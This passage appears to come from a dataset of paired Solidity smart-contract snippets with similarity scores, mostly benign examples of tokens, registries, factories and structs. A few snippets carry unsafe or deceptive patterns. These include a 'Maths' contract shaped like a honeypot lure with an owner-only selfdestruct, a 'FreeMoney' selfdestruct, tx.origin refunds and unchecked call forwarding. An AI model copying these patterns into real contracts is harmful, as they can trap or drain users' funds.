}",0.5535484077868577,"contract Registry is Ownable {
    mapping(bytes32 => address) internal contracts;

    function lookup(bytes32 _hashedName) external view returns(address) {
        return contracts[_hashedName];
    }

    function lookup(string memory _name) public view returns(address){
        return contracts[keccak256(abi.encodePacked(_name))];
    }

    function setContract(string memory _name, address _contractAddress) public {
        setContract(keccak256(abi.encodePacked(_name)), _contractAddress);
    }

    function setContract(bytes32 _hashedName, address _contractAddress) public onlyOwner {
        contracts[_hashedName] = _contractAddress;
    }
}"
"contract A {
  B private b;

  constructor (B _b) public {
    b = _b;
  }

  function bar () public {
    address [] memory keys;
    B.S [] memory values;

    (keys, values) = b.foo ();
  }
}",0.5807471003931095,"contract BurnableERC20 is ERC20
{
    function burn(
        uint value
        )
        public
        returns (bool);

    function burnFrom(
        address from,
        uint value
        )
        public
        returns (bool);
}"
"contract B {
  struct S {
    uint x;
    uint y;
  }

  mapping (address => S) private structs;
  address [] private keys;

  function foo () public view returns (address [] memory _keys, S [] memory _values) {
    _keys = keys;
    _values = new S [] (_keys.length);
    for (uint i = 0; i < _keys.length; i++)
      _values [i] = structs [_keys [i]];
  }
}",0.5871005291949448,"contract BalanceQuerier {
    function getBalances(
        address user,
        address[] memory assetIds
    )
        public
        view
        returns (uint256[] memory)
    {
        uint256[] memory balances = new uint256[](assetIds.length);
        for(uint256 i; i < assetIds.length; i++) {
            address assetId = assetIds[i];
            balances[i] = ERC20(assetId).balanceOf(user);
        }

        return balances;
    }
}"
"contract A is I {
    function deployB() {
        new B();
    }
    function doSomething() {}
}",0.5574109352662031,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract InvoiceManager {
    struct INVOICE {
        bool valid;
        ...
    }

    mapping (uint => INVOICE) invoices;

    event InvoiceCreated(uint id, ...);
    event InvoicePaid(uint id, ...)
    ...

    function createInvoice(uint id, uint sum, ...) {
        ...
        INVOICE storage invoice = invoices[id];
        require(!invoice.valid);
        ...
        emit InvoiceCreated(invoice, ...)
    }

    function payInvoice(uint id) public payable {
        ... process payment ...
        emit InvoicePaid(id, ...)
    }
}",0.5107069704304551,"contract Wallet is Ownable {



    event ReceiveEther(address indexed _sender, uint256 _value);

    event Pay(address indexed _sender, uint256 _value);



    function() external payable {

        emit ReceiveEther(msg.sender, msg.value);

    }



    function pay(address payable _beneficiary) public onlyOwner {

        uint256 amount = address(this).balance;

        _beneficiary.transfer(amount);

        emit Pay(_beneficiary, amount);

    }



}"
"contract Bar {
    
    Foo public foo = new Foo(); 

    
    Foo public foo2 = Foo(0xF00BAA...); 

    
    address public hoo;

    
    function kungFoo(Foo sumFoo) internal {
        sumFoo.chop();
    }

    
    function kungHoo(address sumHoo) public {
        hoo = sumHoo;
        Foo(hoo).chop();
    }
}",0.5547753146884141,"contract StrictToken is Token {

    bool public strict = true;

    mapping (address => uint256) public rate;



    function getRate(address _address) public view returns (uint256);

    function getStrict() public pure returns (bool);

}"
"contract c_Intl {
    l_Intl.lstore cstore;
    function set (uint _num) { l_Intl.set(cstore, _num); }
}",0.5422491737425047,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract c_Pub {
    l_Pub.lstore cstore;
    function set (uint _num) { l_Pub.set(cstore, _num); }
}",0.5464705261654784,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract HelpLogs {

  event LogFirstHalf(bytes _data);
  event LogSecondHalf(bytes _data);

  function logit(bytes data) external {
      uint midpoint = data.length / 2;
      bytes memory data1 = new bytes(midpoint);
      for (uint i = 0; i < midpoint; i++) {
          data1[i] = data[i];
      }
      bytes memory data2 = new bytes(data.length - midpoint);
      for (i = 0; i < data.length - midpoint; i++) {
          data2[i] = data[i + midpoint];
      }
      LogFirstHalf(data1);
      LogSecondHalf(data2);
  }
}",0.5000943014117397,"contract ContractReceiver {
     
   struct TKN {
        address sender;
        uint value;
        bytes data;
        bytes4 sig;
    }
    
    address [] public senders;
    function tokenFallback(address _from, uint _value, bytes _data) public  {
        require(_from != address(0));
        require(_value>0);
        TKN memory tkn;
        tkn.sender = _from;
        tkn.value = _value;
        tkn.data = _data;
        uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24);
        tkn.sig = bytes4(u);
        senders.push(_from);
    }
}"
"contract TestLottery1 {
  uint public initialBalance = 1 ether;
  Lottery lottery = Lottery(DeployedAddresses.Lottery());

  
  function testUserCanParticipate() public {
    address returnedId = lottery.participate.value(1)(); 
    address expected = msg.sender;
    Assert.equal(returnedId, expected, ""You are participating"");
  }
}",0.521739336942359,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract Token {

    address officialCrowdsale;

    function investCrowdsale(uint256 _value, bytes _extraData) returns (bool success) {
        allowance[msg.sender][officialCrowdsale] = _value;     
        Crowdsale crowdsale = Crowdsale(officialCrowdsale);
        crowdsale.investFromToken(msg.sender, _value, _extraData);
        return true; 
    }

}",0.5691859439659036,"contract FaceblockCrowdsale is Crowdsale {
    function FaceblockCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) 
        Crowdsale(_startTime, _endTime, _rate, _wallet)
    {

    }

    function createTokenContract() internal returns (MintableToken) {
        return new FaceblockToken();
    }
}"
"contract BetProposition {
       uint public somevar;

       function BetProposition(uint _some) public {
         somevar = _some;
       }
   }",0.5952033141044039,"contract WethInterface is ERC20 {
    function deposit() public payable;
    function withdraw(uint) public;
}"
"contract Tester2 {
        mapping(uint => BetProposition[]) bets;

        function getBetsForMatchup(uint matchupIdentifier) public view returns (BetProposition[]) {
            return bets[matchupIdentifier];
        }

        function other(uint matchupIdentifier) public view returns(uint) {
             uint total = 0;
             BetProposition[] memory betsToCancel = getBetsForMatchup(matchupIdentifier);
             for (uint i = 0; i < betsToCancel.length; i++) {
                 total = total + betsToCancel[i].somevar();
             }
             return total;
        }
}",0.554131547818644,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;

  

  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }





  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= balances[msg.sender]);



   

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }

 

}"
"contract SimpleAuctionFactory {

    function newSimpleAuction(uint duration) returns(address createdAuctionContract) {
        SimpleAuction newSimpleAuction = new SimpleAuction(duration, msg.sender);
        return newSimpleAuction;
    }
}",0.5198587143159553,"contract UpgradableStorage is Ownable {



  

  address internal _implementation;



  event NewImplementation(address implementation);



  

  function implementation() public view returns (address) {

    return _implementation;

  }

}"
"contract Factory {

    address[] public volatileContracts;
    event LogCreatedVolatileContract(address sender, address volatileContract);
    event LogKilledVolatileContract(address sender, address volatileContract);

    

    function createVolatileContracts() public returns(bool success) {
        require(volatileContracts.length==0, ""Ten at a time, please."");
        for(uint i=0; i<10; i++) {
            Volatile v = new Volatile();
            volatileContracts.push(address(v));
            emit LogCreatedVolatileContract(msg.sender, address(v));
        }
        return true;
    }

    function destroyVolatileContracts() public returns(bool success) {
        for(uint i=0; i<10; i++) {
            emit LogKilledVolatileContract(msg.sender, volatileContracts[i]);
            Volatile v = Volatile(volatileContracts[i]);
            v.kill();
        }
        volatileContracts.length=0;
        return true;
    }

}",0.5603557147671288,"contract DigitalDollarRetainerFactory {


mapping (address => bool) public validContracts;
address[] public contracts;


function getContractCount()
public
view
returns(uint contractCount)
{
return contracts.length;
}


function getDeployedContracts() public view returns (address[])
{
return contracts;
}


function newDigitalDollarRetainer(address _client, address _provider, string _deliverable, string _governingLawandForum, uint256 _retainerDurationinDays, uint256 _deliverableRate, uint256 _payCap)
public
returns(address)
{
DigitalDollarRetainer c = new DigitalDollarRetainer(_client, _provider, _deliverable, _governingLawandForum, _retainerDurationinDays, _deliverableRate, _payCap);
validContracts[c] = true;
contracts.push(c);
return c;
}
}"
"contract Coupons {
    uint256 public totalSupply;
    uint256 public amountAvailable;
    mapping(address => uint256) public amountReserved;

    function issue(uint256 howMany) external {
        
        require(totalSupply + howMany >= totalSupply);

        totalSupply += howMany;
        amountAvailable += howMany;
    }

    function reserve(uint256 howMany) external {
        require(amountAvailable >= howMany);

        amountReserved[msg.sender] += howMany;
        amountAvailable -= howMany;
    }

    function stateOf(uint256 which) external view returns (bool) {
        return which <= totalSupply - amountAvailable;
    }
}",0.5893463428709206,"contract BasicToken is ERC20Basic {using SafeMath for uint256;mapping(address => uint256) balances;uint256 totalSupply_;function totalSupply() public view returns (uint256) {return totalSupply_;}function transfer(address _to, uint256 _value) public returns (bool) {require(_to != address(0));require(_value <= balances[msg.sender]);balances[msg.sender] = balances[msg.sender].sub(_value);balances[_to] = balances[_to].add(_value);emit Transfer(msg.sender, _to, _value);return true;}function balanceOf(address _owner) public view returns (uint256) {return balances[_owner];}}"
"contract TestString {
    function stringConcat(string memory a, string memory b) public pure returns (string memory) {
       bytes memory bytesA = bytes(a);
       bytes memory bytesB = bytes(b);

       string memory finalLength = new string(bytesA.length + bytesB.length);

       bytes memory finalBytes = bytes(finalLength);

       uint256 k = 0;
       for(uint256 i = 0; i < bytesA.length; i++) {
           finalBytes[k++] = bytesA[i];
       }

       for(uint256 i = 0; i < bytesB.length; i++) {
           finalBytes[k++] = bytesB[i];
       }

       return string(finalBytes);
    }
}",0.5513442560469675,"contract ERC20Detailed is ERC20 {
    string private _name;
    string private _symbol;
    uint256 private _decimals;

    
    constructor (string memory name, string memory symbol, uint256 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint256) {
        return _decimals;
    }
}"
"contract Game {

  mapping (address => uint) playerSteps;

  function NewGame() {
    playerSteps[msg.sender] = 0;
  }

  function NextRound() {
    playerSteps[msg.sender] = playerSteps[msg.sender] + 1;

    if (playerSteps[msg.sender] == 1) {
      
    }

    if (playerSteps[msg.sender] == 2) {
      
    }

    

  }

}",0.5611591581764934,"contract Maths

{

    address Z = msg.sender;

    function() public payable {}

    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }

    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }

 }"
"contract C {
    uint[] data1;
    uint[] data2;

    function appendOne() {
        append(data1);
    }

    function appendTwo() {
        append(data2);
    }

    function append(uint[] storage d) internal{
        d.push(1);
    }
}",0.5787696644436816,"contract FlapLike {
    function kick(uint lot, uint bid) external returns (uint);
    function cage(uint) external;
    function live() external returns (uint);
}"
"contract ABCToken {
    function sell(uint abcAmount) public {
        uint ethAmount = myFunc(abcAmount);
        msg.sender.transfer(ethAmount);
    }
}",0.5904452460397664,"contract TokenController {

    

    

    

    

    

    

    function onTokenTransfer(address _from, uint _fromBalance, uint _amount) public returns(uint);

}"
"contract SimpleIntrospection {

    bytes public BYTECODE;
    bytes public ABI;

    function setByteCode(bytes memory _bytecode, bytes memory _abi) public {
        require(BYTECODE.length == 0, ""Already set."");
        require(_bytecode.length > 0, ""Send byteCode."");
        require(_abi.length > 0, ""send ABI"");
        BYTECODE = _bytecode;
        ABI = _abi;
    }
}",0.5146486511566288,"contract GlobalConstraintInterface {

    enum CallPhase { Pre, Post, PreAndPost }

    function pre( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);
    function post( address _scheme, bytes32 _params, bytes32 _method ) public returns(bool);
    
    function when() public returns(CallPhase);
}"
"contract UserB {
...
UserA userA
...
function UserB(address userA) {
   userA = UserA(userA);
}
",0.5239248380000687,"contract WETH_0x {

    

    function balanceOf(address userAddress) public view returns (uint);

}"
"contract GetYourSigFromMsgData {
    function f() public pure returns (bytes4) {
        return (bytes4(msg.data[0]) | bytes4(msg.data[1]) >> 8 |
            bytes4(msg.data[2]) >> 16 | bytes4(msg.data[3]) >> 24);
    }
}",0.56300171597501,"contract AbstractGameHidden
{
    function CalculateFinalDistance(bytes32 raw0, bytes32 raw1, bytes32 raw2, bytes32 raw3) pure public returns (int64, int64, uint64);
}"
"contract Bar is Foo {
  function doStuff() external override pure returns(string memory) {
    return ""do stuff from Bar.sol"";
  }
}",0.5942143985347504,"contract ERC20Plus is ERC20 {

    function symbol() external view returns(string);

    function totalSupply() external view returns(uint);

}"
"contract C {
        uint someVariable;
        uint[] data;

        function f() {
            uint[] x;
            x.push(2);
            data = x;
        }
    }",0.5729453184010375,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract College {
    address student;
    Department dept_instance;

    function College ( address _student , address _department  ) {
        student = _student;
        dept_instance = Department(_department);
     }

    function chooseDept ( uint id ) payable returns (bool value) {
        bool ret = student.send(msg.value);
        if (!ret)
            return dept_instance.enroll(id, msg.sender);
        else
            throw;
    }
}",0.5879325783111641,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) constant returns (uint);
  function transferFrom(address from, address to, uint value) returns (bool);
  function approve(address spender, uint value) returns (bool);
  event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract OuterContract is InnerContract{
    InnerContract pInnerContract = InnerContract(0xdc04977a2078c8ffdf086d618d1f961b6c546222);
   function func(uint256 val) external returns (uint256) {
        return  pInnerContract.func(val) + 1;
    }
}",0.5124098427915674,"contract MigrationAgent {

  uint256 public originalSupply;
  
  function migrateFrom(address _from, uint256 _value) external returns(bool);
  
  
  function isMigrationAgent() external constant returns (bool) {
    return true;
  }
}"
"contract Receiver {

  struct Thing {
    uint x;
    uint y;
  }

  address old;

  function Receiver() {
    old = msg.sender;
  }

  function pull() returns(bytes32[10] en, uint[10] ay, uint snow, uint ex, uint why) {
    Old o = Old(old); 
    Thing memory thing;
    bytes32[10] memory n;
    uint[10] memory a;
    uint sno;
    (n, a, sno, thing.x, thing.y) = o.output();
    return (n,a,sno,thing.x, thing.y);
    }
  }",0.5686106095747241,"contract DSMath {

    function add(uint x, uint y) internal pure returns (uint z) {

        require((z = x + y) >= x, ""ds-math-add-overflow"");

    }

    function sub(uint x, uint y) internal pure returns (uint z) {

        require((z = x - y) <= x, ""ds-math-sub-underflow"");

    }

    function mul(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x, ""ds-math-mul-overflow"");

    }

}"
"contract Contract {

  struct Simple {
      int a;
      int b;
  }

  Simple[] public array;

  function add(Simple[] memory _array) public {
    for(uint i=0; i<_array.length; i++){
        array.push(_array[i]);
    } 
  }

}",0.5595457544804491,"contract dynamictest{

    uint public a;

    uint public b;

    function test(uint foo) public {

        if (tx.gasprice > foo){

            a=1;

            return;

        }

        if (tx.gasprice < foo){

            a=1;

            b=1;

            return;

        }

    }

}"
"contract DeleteArrayElement {

    address[] public entities;

    constructor() public {
        entities.push(1); 
        entities.push(2); 
        entities.push(3); 
        delete entities[1];
    }

    function isEmpty(uint row) public view returns(bool isIndeed) {
        return entities[row] == address(0);
    }

}",0.5778207632449494,"contract RINGAuthority {



    address public ringOwner;



    constructor(address _ringOwner) public {

        ringOwner = _ringOwner;

    }



    function canCall(

        address _src, address _dst, bytes4 _sig

    ) public view returns (bool) {

        return ( ringOwner == _src );

    }

}"
"contract AddressRatings {

    struct Rating {
        uint256 amtOfRatings;
        uint256 sumOfRatings;
        uint8 average;
    }

    mapping(address => mapping(address => uint8)) public ratingsPerAddress;

    mapping (address => Rating ) public ratings;

    function rateAddress (address _addr, uint8 _rating) external {
        require(_rating > 0 && _rating < 6); 
        require(ratingsPerAddress[_addr][msg.sender] == 0); 

        ratingsPerAddress[_addr][msg.sender] = _rating;

        ratings[_addr].amtOfRatings++;
        ratings[_addr].sumOfRatings += _rating;
        ratings[_addr].average = uint8(ratings[_addr].sumOfRatings/ratings[_addr].amtOfRatings);
    }

}",0.5179828697760324,"contract Fork is Owned {
    
    address public uploader;
    address public tokenAddress;
    
    function Fork(address _uploader) public {
        uploader = _uploader;
    }
    
    function changeTokenAddress(address newTokenAddress) external onlyForOwner {
        tokenAddress = newTokenAddress;
    }
    function upload(address[] addr, uint256[] amount) external onlyForUploader {
        require( addr.length == amount.length );
        for ( uint256 a=0 ; a<addr.length ; a++ ) {
            require( Token(tokenAddress).mint(addr[a], amount[a]) );
        }
    }
    
    modifier onlyForUploader {
        require( msg.sender == uploader );
        _;
    }
}"
"contract Test {

    struct S {
        string s;
        uint u;
    }

    function returnTwoValues() private returns (string s, uint u) {
        s = ""123"";
        u = 123;
        return(s, u);
    }

    constructor() {
        (string memory a, uint b) = returnTwoValues();
        S memory s = S(a,b);
    }
}",0.5857787165307384,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract chargingContract {      

function verify(string message, address p, bytes32 hash, uint8 v, bytes32 r, bytes32 s) pure public returns(bool) {
  bytes memory prefix = ""\x19Ethereum Signed Message:\n32""; 
  bytes32 prefixedHash = keccak256(prefix, hash);
  bytes32 hashedMessage = sha3(message);
  return ecrecover(prefixedHash, v, r, s) == p && hashedMessage == hash;
 }
}",0.5357533129206489,"contract MerkleIO {

    address public owner = msg.sender;

    mapping(bytes32 => uint256) public hashes; 

    

    event Hashed(bytes32 indexed hash, uint256 timestamp); 

    

    function store(bytes32 hash) external { 

        assert(msg.sender == owner);

    

        hashes[hash] = block.timestamp;

        

        emit Hashed(hash, block.timestamp);

    }

    

    function changeOwner(address ownerNew) external {

        assert(msg.sender == owner);

        

        owner = ownerNew;

    }

}"
"contract InvalidJump2 {
    function invalidJump2(uint number) {
        invalidJump2(number - 1);
    }
}",0.5068934299776768,"contract father {

    function fallback(uint num,address sender,uint amount) public;

}"
"contract D {

  
  struct DocumentStruct{
    
    bytes32 name;
    uint value;
  }

  
  mapping(bytes32 => DocumentStruct) public documentStructs;

  
  function StoreDocument(bytes32 key, bytes32 name, uint value) returns (bool success) {
   documentStructs[key].name  = name;
   documentStructs[key].value = value;
   return true;
  }

}",0.5835583467345623,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract E {

  
  D d;

  
  struct DocumentStruct{
    bytes32 name;
    uint value;
  }    

  
  function E(address DContractAddress) {
    d = D(DContractAddress);
  }

  function RetrieveData(bytes32 key) 
    public
    constant
    returns(bytes32, uint) 
  {
    
    DocumentStruct memory doc;
    
    (doc.name, doc.value) = d.documentStructs(key);
    
    return(doc.name, doc.value);
  }
}",0.5869551748439968,"contract ERC223Interface {

    uint public totalSupply;

    function balanceOf(address who) constant public returns (uint);

    function transfer(address to, uint value, bytes data) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint value, bytes data);

}"
"contract Counter {
    int counter; 

    event CounterIncremented(address indexed _by, int _newValue);
    event CounterDecremented(address indexed _by, int _newValue);

    function increment(int _value) public {
        counter = counter + _value;
        emit CounterIncremented(msg.sender, counter);
    }

    function deincrement(int _value) public {
        counter = counter - _value;
        emit CounterDecremented(msg.sender, counter);
    }
}",0.587072289292098,"contract Proxy is Owned {
    event Forwarded (address indexed destination, uint value, bytes data);
    event Received (address indexed sender, uint value);

    function () payable { Received(msg.sender, msg.value); }

    function forward(address destination, uint value, bytes data) public onlyOwner {
        require(destination.call.value(value)(data));
        Forwarded(destination, value, data);
    }
}"
"contract One {
    enum e { ZERO, ONE, TWO }
    e public myE;

    function setE(e _newE) public {
        myE = _newE;
    }
}",0.5511091999466065,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Other {
    One public myOne = new One();

    function doSomething() public {
        myOne.setE(One.e.ONE);
    }
}",0.5832005505723782,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract OfferContract {

    address public owner;
    struct Offer {
        string title;
        string description;
        uint  offerTime;
        mapping (address => uint) subscribers;
        mapping (uint => address) subscribersAddress;
        mapping (uint => uint) nbrSubscribersPerID;
        uint price;
    }

    Offer[] public  offers;


    
    function addOffer(string  description1, string title1, uint price1,uint offerTime1) public
      returns (uint, string, string, uint, uint) {
        uint offerID = offers.length++;
        Offer storage o = offers[offerID];

        o.description = description1;
        o.offerTime=offerTime1;
        o.title = title1;
        o.price = price1;
        return (offerID, offers[offerID].description, offers[offerID].title, offers[offerID].price, 
          offers[offerID].offerTime);
    }

    
    function returnNbroffer() constant public returns(uint) {
        uint nbr_offer =offers.length;
        return(nbr_offer);
    }
}",0.5669246579006552,"contract Token
{
	string internal _symbol;
	string internal _name;
	uint8 internal _decimals;	
    uint internal _totalSupply;
   	mapping(address =>uint) internal _balanceOf;
	mapping(address => mapping(address => uint)) internal _allowances;

    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public{
	    _symbol = symbol;
		_name = name;
		_decimals = decimals;
		_totalSupply = totalSupply;
    }

	function name() public constant returns (string){
        	return _name;    
	}

	function symbol() public constant returns (string){
        	return _symbol;    
	}

	function decimals() public constant returns (uint8){
		return _decimals;
	}

	function totalSupply() public constant returns (uint){
        	return _totalSupply;
	}
            	
	event Transfer(address indexed _from, address indexed _to, uint _value);	
}"
"contract NestedStructs {

    using HitchensUnorderedAddressSetLib for HitchensUnorderedAddressSetLib.Set;

    struct UserStruct {
        uint balance;
        bool active;
        HitchensUnorderedAddressSetLib.Set followingSet;
        HitchensUnorderedAddressSetLib.Set followerSet;
    }

    mapping(address => UserStruct) userStructs;
    HitchensUnorderedAddressSetLib.Set userSet;

    function createUser(address user) public { 
        UserStruct storage u = userStructs[user];
        userSet.insert(user); 
        u.active = true;
    }

    function join() public {
        createUser(msg.sender);
    }

    function followUser(address followed ) public {
        require(userSet.exists(msg.sender), ""Join first please."");
        require(userSet.exists(followed), ""Follow a joined user please."");
        UserStruct storage u = userStructs[msg.sender];
        UserStruct storage f = userStructs[followed];
        u.followingSet.insert(followed);
        f.followerSet.insert(msg.sender); 
    }

    function unFollowUser(address unfollow) public {
        
        UserStruct storage u = userStructs[msg.sender];
        UserStruct storage f = userStructs[unfollow];
        u.followingSet.remove(unfollow);
        f.followerSet.remove(msg.sender); 
    }

    function isUser(address user) public view returns(bool) {
        return userSet.exists(user);
    }

    function userCount() public view returns(uint) {
        return userSet.count();
    }

    function userInfo(address user) public view returns(uint balance, bool active, uint followingCount, uint followerCount) {
        UserStruct storage u = userStructs[user];
        balance = u.balance;
        active = u.active;
        followingCount = u.followingSet.count();
        followerCount = u.followerSet.count();
    }

    function userFollowerAtIndex(address user, uint index) public view returns(address) {
        return userStructs[user].followerSet.keyAtIndex(index);
    }

    function userFollowingAtIndex(address user, uint index) public view returns(address) {
        return userStructs[user].followingSet.keyAtIndex(index);
    }
}",0.5541793377718341,"contract ERC20 is IERC20 {

    using SafeMath for uint256;



    mapping (address => uint256) internal _balances;



    mapping (address => mapping (address => uint256)) private _allowed;



    uint256 internal _totalSupply;



    

    function totalSupply() public view returns (uint256) {

        return _totalSupply;

    }



    

    function balanceOf(address owner) public view returns (uint256) {

        return _balances[owner];

    }



    

    function allowance(address owner, address spender) public view returns (uint256) {

        return _allowed[owner][spender];

    }



    

    function transfer(address to, uint256 value) public returns (bool) {

        _transfer(msg.sender, to, value);

        return true;

    }



    

    function approve(address spender, uint256 value) public returns (bool) {

        require(spender != address(0));



        _allowed[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);

        return true;

    }



    

    function transferFrom(address from, address to, uint256 value) public returns (bool) {

        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

        _transfer(from, to, value);

        return true;

    }



    

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {

        require(spender != address(0));



        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].add(addedValue);

        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);

        return true;

    }



    

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {

        require(spender != address(0));



        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].sub(subtractedValue);

        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);

        return true;

    }



    

    function _transfer(address from, address to, uint256 value) internal {

        require(to != address(0));



        _balances[from] = _balances[from].sub(value);

        _balances[to] = _balances[to].add(value);

        emit Transfer(from, to, value);

    }



}"
"contract Isolated is Cautious {

    

}",0.5916532775429361,"contract Creator is Ownable {
}"
"contract Demo {
    event Deposit(
        address indexed _from,
        bytes32 indexed _id,
        uint256 _value
    );

    function highLevelEvent() public {
        bytes32 _id = 0x420042;
        emit Deposit(msg.sender, _id, 123);
    }

    function lowLevelEvent() public {
        bytes32 _id = 0x420042;
        log3(
            bytes32(123),
            bytes32(keccak256(""Deposit(address,bytes32,uint256)"")),
            bytes32(msg.sender),
            _id
        );
    }
}",0.5842756408456298,"contract ERC223 is ERC20 {

    function transfer(address to, uint256 value, bytes data) public returns (bool);

    function transferFrom(address from, address to, uint256 value, bytes data) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint256 indexed _value, bytes _data);

}"
"contract UserFactory {
    User[] public users;
    function createUser(uint256 _id, bytes32 _name, uint8 _age) external {
        User user = new User(_id, _name, _age);

        emit UserCreated(user, users.length);

        users.push(user);
    }

    event UserCreated(User user, uint256 index);
}",0.5657866030676177,"contract IDai {
  function transferFrom(address src, address dst, uint wad) public returns (bool) {}
  function permit(address holder, address spender, uint256 nonce, uint256 expiry,
    bool allowed, uint8 v, bytes32 r, bytes32 s) external {}
}"
"contract C {
  uint x;
  uint y;

  function f() {
    x = 1;
    y = x;  
    x = 2;
    y = x;  
  }
}",0.5386677307387611,"contract Stats {
  function getDay( uint128 day) public view returns (uint);
}"
"contract Mycontract {

    uint256[] public barLengthToBarAmtForSale;

    constructor() public {
        uint16 counter = uint16(0);
        while(counter <= 10) {
            barLengthToBarAmtForSale.push(uint256(0));
            counter++;
        }
    }

    function test() public {
        uint16 _length = 5;
        barLengthToBarAmtForSale[_length]++;
    }


}",0.5573085427685397,"contract Contract {

  struct Contributor {

    uint256 balance;

    uint256 balance_bonus;

    uint256 fee;

    bool whitelisted;

  }

  mapping (address => Contributor) public contributors;

  uint256 public contract_eth_value;

  uint256 public contract_eth_value_fee;

}"
"contract A {
  ERC20 token; 
  B seller;    

  event TicketPurchased(uint);

  function buyTicket(uint amount) public {

    
    token.approve(address(seller), amount);

    
    uint ticketId = seller.buyTicket(amount);

    
    emit TicketPurchased(ticketId);
  }
}",0.5728146563733346,"contract CubegoPresale {

    function buySinglePackByToken(address _buyer, uint _tokens, uint _packId, uint _amount) external;

    function buyUltimatePackByToken(address _buyer, uint _tokens, uint _amount) external;

}"
"contract Caller {

    Called public called_address;

    function set_address(address _addy) {
        called_address = Called(_addy);
    }

    function set(uint256 _var) {
        called_address.set(_var);
    } 

    function set_call(address _called, uint256 _var) {
        _called.call(bytes4(sha3(""set(uint256)"")), _var);
    }
}",0.5909614372493157,"contract ERC20MOVEInterface {

    function balanceOf(address owner) public view returns (uint256);

    function allowance(address owner, address spender) public view returns (uint256);

    function burnFrom(address from, uint256 value) public;

}"
"contract SomeContract {

    event SomeEvent(address sender);

    
    function() public payable {
    }

    modifier refundGasCost()
    {
        uint remainingGasStart = msg.gas;

        _;

        uint remainingGasEnd = msg.gas;
        uint usedGas = remainingGasStart - remainingGasEnd;
        
        usedGas += 21000 + 9700;
        
        uint gasCost = usedGas * tx.gasprice;
        
        tx.origin.transfer(gasCost);
    }

    function doSomething() external refundGasCost {
        SomeEvent(msg.sender);  
    }
}",0.5284306196699603,"contract Wallet is Ownable {



    event ReceiveEther(address indexed _sender, uint256 _value);

    event Pay(address indexed _sender, uint256 _value);



    function() external payable {

        emit ReceiveEther(msg.sender, msg.value);

    }



    function pay(address payable _beneficiary) public onlyOwner {

        uint256 amount = address(this).balance;

        _beneficiary.transfer(amount);

        emit Pay(_beneficiary, amount);

    }



}"
"contract Test {

    struct MyStruct {
        Point x;
        Point y;
    } 

    struct Point {
        uint256 x;
        uint256 y;
    }

    function testFunc() public pure returns (uint256, uint256, uint256, uint256) {
        MyStruct memory data1 = MyStruct(Point(3,5), Point(7,9));
        return myFunc(data1);
    }

    function myFunc(MyStruct memory data) internal pure returns (uint256 _x, uint256 _y, uint256 _u, uint256 _v) {
        assembly {

            let first_point := mload(data)
            _x := mload(first_point)
            _y := mload(add(first_point,0x20))

            let second_point := mload(add(data,0x20))
            _u := mload(second_point)
            _v := mload(add(second_point,0x20))

            
        }
    }
}",0.5910565842737849,"contract Utils {
    
    function Utils() internal {
    }

    
    modifier validAddress(address _address) {
        require(_address != 0x0);
        _;
    }

    
    modifier notThis(address _address) {
        require(_address != address(this));
        _;
    }

    

    
    function safeAdd(uint256 _x, uint256 _y) internal pure returns (uint256) {
        uint256 z = _x + _y;
        assert(z >= _x);
        return z;
    }

    
    function safeSub(uint256 _x, uint256 _y) internal pure returns (uint256) {
        assert(_x >= _y);
        return _x - _y;
    }

    
    function safeMul(uint256 _x, uint256 _y) internal pure returns (uint256) {
        uint256 z = _x * _y;
        assert(_x == 0 || z / _x == _y);
        return z;
    }
}"
"contract PayMain {
  Main main;
  function PayMain(address _m) {
     main = Main(_m);
  }
  function () payable {
    
    
    
    main.handlePayment.value(msg.value)(msg.sender);
  }
}",0.5535296922649311,"contract FreeMoney {
    function take() public payable {
        if (msg.value > 15 finney) {
            selfdestruct(msg.sender);
        }
